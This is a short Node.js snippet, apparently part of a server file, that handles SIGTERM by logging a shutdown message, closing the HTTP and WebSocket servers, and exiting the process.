process.on('SIGTERM', () => {
  log('[Server] Shutting down...');
  server.close();
  wss.close();
  process.exit(0);
});
